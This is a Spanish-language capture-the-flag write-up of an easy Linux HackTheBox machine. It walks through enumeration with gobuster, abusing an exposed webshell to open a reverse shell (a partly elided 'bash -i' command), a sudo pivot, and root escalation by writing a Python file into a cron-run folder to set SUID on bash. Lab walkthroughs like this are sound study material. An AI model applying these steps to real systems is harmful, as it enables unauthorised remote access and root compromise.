
--- 
- Tags:  #linux #Easy #HTB #web #sudo #CronJob 
- --
#### QUÉ SE EXPLOTA?

Web Enumeration
Abusing WebShell Utility (RCE)
Abusing Sudoers Privilege (User Pivoting)
Detecting Cron Jobs Running on the System
Exploiting Cron Job Through File Manipulation in Python Executed by Root [Privilege Escalation]

#### Write UP

##### PRIMERA FASE: Escaneos

Como siempre vamos a empezar nuestra primera fase **Haciendo el primer escaneo con el proposito de ver que puertos están abiertos**

![[Pasted image 20251026081444.png]]

Tras haber realizado el primer escaneo **proseguimos a realizar el segundo** en este escaneo **vamos a analizar con mayor profundidad los puertos descubiertos con el primer escaneo** 

![[Pasted image 20251026081459.png]]

**Descubrimos que el puerto 80 está abierto** esto nos indica que hay una página web corriendo. 

proseguimos a inspeccionar la página web, sin embargo, no encontramos mucho. 

![[Pasted image 20251026082052.png]]
##### SEGUNDA FASE: Explotación

**Debido a que no encontramos mucho**, empezaremos la fase de explotación, lo primero que haremos será empezar con **reconocimiento áctivo** en esta fase emplearemos **[[GoBuster]]** para descubrir posibles directorios que haya. 

```bash

gobuster dir /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt -t 200 -u http://10.10.10.68
```

![[Pasted image 20251026082402.png]]

**checamos las rutas encontradas** pero, la única que nos devolvió algo relativamente significante fue **/dev**. 

![[Pasted image 20251026082537.png]]

**Encontramos dentro de dev, una webshell**, al parecer esta webshell ejecutaba comandos a nivel sistema. 

![[Pasted image 20251026082600.png]]

**Ya que tenemos capacidad de ejecución de codigo** nos entablamos una [[Reverse shell]] **con el comando clásico**, además hay que agregar 'bash -c' cuando queremos indicar al sistema que lo ejecute con bash.:

```bash

bash -c 'bash -i >%26....'
```


*NOTA: ES IMPORTANTE CAMBIAR EL "&" por "%26" a nivel web* esto para que no entré en conflicto la simbología. Además también *agregamos bash -c* en sistemas donde no tenemos terminal. 

![[Pasted image 20251026083530.png]]
##### TERCERA FASE: Post-Explotación / PRIVESC

**Empezamos checando lo principal** con los [[Comandos utiles para escalar]]... **Con [[SUDO]]** encontramos algo.

Encontramos que **podemos ejecutar diferentes comandos como** `scriptmanager:scriptmanager`

![[Pasted image 20251026084139.png]]

**Sabiendo eso, vamos a escalar de www-data a 'scriptmanager'** con [[SUDO]] **-u**

![[Pasted image 20251026084848.png]]
![[Pasted image 20251026084905.png]]

**Seguimos buscando vectores para escalar a root**. En esta ocasión podríamos haber hecho nuestro [[Scanner Procesos]] pero, en su lugar decidimos usar **[[psypy]]**.
![[Pasted image 20251026091533.png]]
descubrimos que hay algunos **comandos ejecutandose cada cierto tiempo** a nivel sistema con **UID=0** lo cuál siginifica **root**



![[Pasted image 20251026091621.png]]

**basícamente se está ejecutando un comando que entra a una carpeta e itera sobre los archivos de dicha carpeta. posteriormente va a ejecutar con python cualquier archivo dentro de '/scripts' que tenga la terminación .py**

Al estarse ejecutando con **UID=0** solamente tenemos que confirmar que nosotros como scriptmanager tenemos capacidad de escritura en **/scripts** 
![[Pasted image 20251026092000.png]]

somos el propietario de dicha carpeta por lo que **tenemos capacidad de escritura y lectura** 

**Creamos un script python** que ejecute comandos a nivel sistema.
Para eso ocuparemos la **[[libreria OS]]**.  y simplemente haremos un archivo que le otorgue **permisos SUID** a la bash. 

![[Pasted image 20251026092728.png]]

nos ponemos a **monitorear bash** con..

```bash

watch -n1 ls -l /bin/bash
```

![[Pasted image 20251026092837.png]]

![[Pasted image 20251026092910.png]]


**ejecutamos la bash con permisos...** y LISTO

```bash

bash -p

```

![[Pasted image 20251026092950.png]]

j